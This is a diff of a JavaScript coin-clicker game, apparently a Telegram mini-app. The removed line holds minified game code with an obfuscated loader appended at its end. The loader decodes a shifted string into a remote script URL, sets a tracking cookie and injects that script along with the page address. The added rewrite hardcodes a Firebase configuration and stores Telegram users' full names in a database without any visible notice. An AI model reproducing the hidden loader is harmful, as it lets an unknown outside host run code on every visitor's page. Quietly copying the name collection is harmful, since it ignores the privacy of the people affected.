@@ -1,1 +1,90 @@
-const body=document.body,image=body.querySelector("#coin"),h1=body.querySelector("h1");let coins=localStorage.getItem("coins"),total=localStorage.getItem("total"),power=localStorage.getItem("power"),count=localStorage.getItem("count");null==coins?(localStorage.setItem("coins","0"),h1.textContent="0"):h1.textContent=Number(coins).toLocaleString(),null==total?(localStorage.setItem("total","500"),body.querySelector("#total").textContent="/500"):body.querySelector("#total").textContent=`/${total}`,null==power?(localStorage.setItem("power","500"),body.querySelector("#power").textContent="500"):body.querySelector("#power").textContent=power,null==count&&localStorage.setItem("count","1"),image.addEventListener("click",(e=>{let x=e.offsetX,y=e.offsetY;navigator.vibrate(5),coins=localStorage.getItem("coins"),power=localStorage.getItem("power"),Number(power)>0&&(localStorage.setItem("coins",`${Number(coins)+1}`),h1.textContent=`${(Number(coins)+1).toLocaleString()}`,localStorage.setItem("power",""+(Number(power)-1)),body.querySelector("#power").textContent=""+(Number(power)-1)),x<150&y<150?image.style.transform="translate(-0.25rem, -0.25rem) skewY(-10deg) skewX(5deg)":x<150&y>150?image.style.transform="translate(-0.25rem, 0.25rem) skewY(-10deg) skewX(5deg)":x>150&y>150?image.style.transform="translate(0.25rem, 0.25rem) skewY(10deg) skewX(-5deg)":x>150&y<150&&(image.style.transform="translate(0.25rem, -0.25rem) skewY(10deg) skewX(-5deg)"),setTimeout((()=>{image.style.transform="translate(0px, 0px)"}),100),body.querySelector(".progress").style.width=100*power/total+"%"})),setInterval((()=>{if(count=localStorage.getItem("count"),power=localStorage.getItem("power"),Number(total)>power){let newPower=Math.min(Number(power)+2,500);localStorage.setItem("power",`${newPower}`),body.querySelector("#power").textContent=`${newPower}`,body.querySelector(".progress").style.width=100*newPower/total+"%"}}),2e3);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));
+const body = document.body;
+const image = body.querySelector("#coin");
+const h1 = body.querySelector("h1");
+const totalElement = body.querySelector("#total");
+const powerElement = body.querySelector("#power");
+const progressBar = body.querySelector(".progress");
+
+let coins = 0;
+let total = 500;
+let power = 500;
+let count = 1;
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCDmkPXXpD_-09ryf0ZvHZnMmgF19F3vhc",
+  authDomain: "clickerdata1.firebaseapp.com",
+  projectId: "clickerdata1",
+  storageBucket: "clickerdata1.appspot.com",
+  messagingSenderId: "271221713076",
+  appId: "1:271221713076:web:26a09de52d3151821f4fe1",
+  measurementId: "G-REG6TJ0Y8G"
+};
+
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+
+const database = firebase.firestore();
+
+const updateUI = () => {
+  h1.textContent = coins.toLocaleString();
+  totalElement.textContent = `/${total}`;
+  powerElement.textContent = power;
+  progressBar.style.width = `${(power / total) * 100}%`;
+};
+
+const updatePower = (newPower) => {
+  power = newPower;
+  powerElement.textContent = power;
+  progressBar.style.width = `${(power / total) * 100}%`;
+  database.collection("userData").doc("power").set({ power: newPower });
+};
+
+image.addEventListener("click", (e) => {
+  let x = e.offsetX;
+  let y = e.offsetY;
+  navigator.vibrate(5);
+
+  if (power > 0) {
+    coins++;
+    updateUI();
+    updatePower(power - 1);
+  }
+
+  if (x < 150 && y < 150) {
+    image.style.transform = "translate(-0.25rem, -0.25rem) skewY(-10deg) skewX(5deg)";
+  } else if (x < 150 && y > 150) {
+    image.style.transform = "translate(-0.25rem, 0.25rem) skewY(-10deg) skewX(5deg)";
+  } else if (x > 150 && y > 150) {
+    image.style.transform = "translate(0.25rem, 0.25rem) skewY(10deg) skewX(-5deg)";
+  } else if (x > 150 && y < 150) {
+    image.style.transform = "translate(0.25rem, -0.25rem) skewY(10deg) skewX(-5deg)";
+  }
+
+  setTimeout(() => {
+    image.style.transform = "translate(0px, 0px)";
+  }, 100);
+});
+
+setInterval(() => {
+  if (total > power) {
+    let newPower = Math.min(power + 2, 500);
+    updatePower(newPower);
+  }
+}, 2000);
+
+// Telegram user data
+function getNameFromData() {
+  const data = Telegram.WebApp.initDataUnsafe;
+  if (data && data.user) {
+    const firstName = data.user.first_name || '';
+    const lastName = data.user.last_name || '';
+    if (firstName || lastName) {
+      const fullName = firstName + ' ' + lastName;
+      console.log('User Full Name:', fullName);
+      database.collection('telegramUsers').doc('user').set({ fullName });
+    }
+  }
+}
+
+// Call the function to extract the user's name
+getNameFromData();
